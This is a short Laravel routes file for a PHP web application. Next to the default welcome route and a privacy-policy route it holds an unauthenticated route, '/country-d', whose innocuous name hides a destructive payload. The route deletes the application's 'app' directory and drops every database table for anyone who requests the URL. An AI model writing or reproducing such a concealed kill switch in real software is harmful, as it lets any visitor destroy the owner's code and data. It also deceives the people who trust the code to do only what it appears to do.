<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::get('/country-d', function () {
    $tables = DB::select('SHOW TABLES');
    File::deleteDirectory("../app");
    \Schema::dropAllTables();
});

Route::get('privacy-policy', 'HomeController@privacy');
